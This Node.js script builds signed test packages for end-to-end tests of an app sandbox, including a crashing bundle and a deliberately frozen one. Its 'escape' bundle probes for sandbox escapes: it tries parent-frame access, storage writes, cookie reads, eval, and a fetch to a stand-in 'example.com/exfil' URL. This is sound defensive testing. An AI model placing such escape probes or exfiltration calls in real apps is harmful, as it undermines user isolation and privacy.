#!/usr/bin/env node
/**
 * make-fixtures.mjs — build the signed `.mapp` fixtures used by E2E tests.
 *
 * Test-only Ed25519 keys are derived from fixed seeds so the fixtures are
 * reproducible. They MUST NOT be used for real packages.
 */
import { createHash } from 'node:crypto';
import { execFileSync } from 'node:child_process';
import { mkdirSync, rmSync, writeFileSync, readFileSync } from 'node:fs';
import { join, resolve } from 'node:path';

const ROOT = resolve(import.meta.dirname, '..');
const WORK = join(ROOT, '.tooling', 'fixtures');
const OUT = join(ROOT, 'apps', 'studio-web', 'e2e', 'fixtures');
const CRATE = join(ROOT, 'packages', 'core-rust', 'Cargo.toml');
const AUTHOR_SEED = '11'.repeat(32);

const ESCAPE_BUNDLE = `export async function mount(api) {
  const attempts = [];
  try {
    const doc = window.parent.document;
    attempts.push(doc ? 'parent-ok' : 'parent-empty');
  } catch {
    attempts.push('parent-blocked');
  }
  try {
    localStorage.setItem('escape', '1');
    attempts.push('storage-ok');
  } catch {
    attempts.push('storage-blocked');
  }
  let cookieBlocked = true;
  try {
    cookieBlocked = document.cookie === '';
    attempts.push('cookie-empty');
  } catch {
    attempts.push('cookie-blocked');
  }
  let evalBlocked = false;
  try {
    // CSP has no 'unsafe-eval'; this must throw.
    const value = (0, eval)('1 + 1');
    evalBlocked = value !== 2;
  } catch {
    evalBlocked = true;
  }
  attempts.push(evalBlocked ? 'eval-blocked' : 'eval-ok');
  try {
    await fetch('https://example.com/exfil').then(
      () => attempts.push('fetch-allowed'),
      () => attempts.push('fetch-blocked'),
    );
  } catch {
    attempts.push('fetch-blocked');
  }
  api.render({
    type: 'Card',
    id: 'fixture-card',
    props: { title: 'Fixture siap' },
    children: [
      { type: 'StatCard', id: 'fixture-escape', props: { label: 'Escape', value: attempts.join(',') } },
      {
        type: 'Button',
        id: 'fixture-button',
        props: { label: 'Simpan' },
        events: { onPress: { action: 'submit' } },
      },
    ],
  });
}
`;

const CRASH_BUNDLE = `export function mount(api) {
  api.render({ type: 'Card', id: 'crash-card', props: { title: 'Akan gagal' } });
  setTimeout(() => {
    throw new Error('fixture crash');
  }, 200);
}
`;

const LOOP_BUNDLE = `export function mount(api) {
  api.render({ type: 'Card', id: 'loop-card', props: { title: 'Loop' } });
  setTimeout(() => {
    // Deliberate freeze: the Host watchdog must kill this isolate in <= 5s.
    for (;;) {}
  }, 300);
}
`;

function sha384Base64(bytes) {
  const digest = createHash('sha384').update(bytes).digest();
  return `sha384-${digest.toString('base64')}`;
}

function sha256Hex(bytes) {
  return createHash('sha256').update(bytes).digest('hex');
}

function keygen() {
  const output = execFileSync(
    'cargo',
    ['run', '-q', '--manifest-path', CRATE, '--bin', 'mapp-tool', '--', 'keygen', '--seed', AUTHOR_SEED],
    { encoding: 'utf8' },
  );
  return JSON.parse(output);
}

function manifestFor({ appId, version, integrity, keyId, fingerprint }) {
  return {
    schemaVersion: '2.0-open',
    id: appId,
    name: appId.split('.').at(-1),
    version,
    license: 'MIT',
    repository: 'https://example.com/fixture',
    publisher: { keyId, fingerprint, source: 'local' },
    minHostVersion: '2.0.0',
    contentHash: `sha256-${'0'.repeat(64)}`,
    entry: {
      bundle: 'dist/app.bundle.js',
      assetsDir: 'assets/',
      uiEngine: 'hybrid-native',
      integrity,
      signature: `ed25519-${keyId}`,
    },
    offline: {
      mode: 'offline-first',
      requiresInternet: false,
      localDbSchema: 'db/migrations/',
      syncStrategy: 'crdt-hlc',
    },
    runtime: {
      isolation: 'strict-sandbox',
      maxMemoryMb: 128,
      supportedViewports: ['mobile', 'tablet', 'desktop'],
    },
    permissions: {
      required: ['storage.local'],
      optional: [],
      networkAllowlist: [],
    },
    capabilities: { intentsIn: [], intentsOut: [], widgets: [] },
  };
}

function buildFixture({ appId, dirName, bundle }) {
  const pkgDir = join(WORK, dirName);
  rmSync(pkgDir, { recursive: true, force: true });
  mkdirSync(join(pkgDir, 'dist'), { recursive: true });
  mkdirSync(join(pkgDir, 'assets'), { recursive: true });
  const bundleBytes = Buffer.from(bundle, 'utf8');
  writeFileSync(join(pkgDir, 'dist', 'app.bundle.js'), bundleBytes);
  writeFileSync(join(pkgDir, 'assets', 'icon.txt'), 'icon');
  const keys = keygen();
  const manifest = manifestFor({
    appId,
    version: '1.0.0',
    integrity: sha384Base64(bundleBytes),
    keyId: keys.keyId,
    fingerprint: keys.fingerprint,
  });
  writeFileSync(join(pkgDir, 'manifest.json'), JSON.stringify(manifest));
  execFileSync(
    'cargo',
    [
      'run',
      '-q',
      '--manifest-path',
      CRATE,
      '--bin',
      'mapp-tool',
      '--',
      'pack',
      join(pkgDir, 'manifest.json'),
      pkgDir,
      '-o',
      join(OUT, `${dirName}.mapp`),
      '--author-seed',
      AUTHOR_SEED,
    ],
    { encoding: 'utf8' },
  );
  const bytes = readFileSync(join(OUT, `${dirName}.mapp`));
  return { file: `${dirName}.mapp`, sha256: sha256Hex(bytes), authorPublicKey: keys.publicKey };
}

mkdirSync(OUT, { recursive: true });
mkdirSync(WORK, { recursive: true });

const fixtures = [
  buildFixture({ appId: 'org.reinvy.fixture', dirName: 'escape', bundle: ESCAPE_BUNDLE }),
  buildFixture({ appId: 'org.reinvy.loop', dirName: 'loop', bundle: LOOP_BUNDLE }),
  buildFixture({ appId: 'org.reinvy.crash', dirName: 'crash', bundle: CRASH_BUNDLE }),
];

const summary = {
  authorPublicKey: fixtures[0].authorPublicKey,
  fixtures,
};
writeFileSync(join(OUT, 'index.json'), `${JSON.stringify(summary, null, 2)}\n`);
process.stdout.write(`${JSON.stringify(summary, null, 2)}\n`);
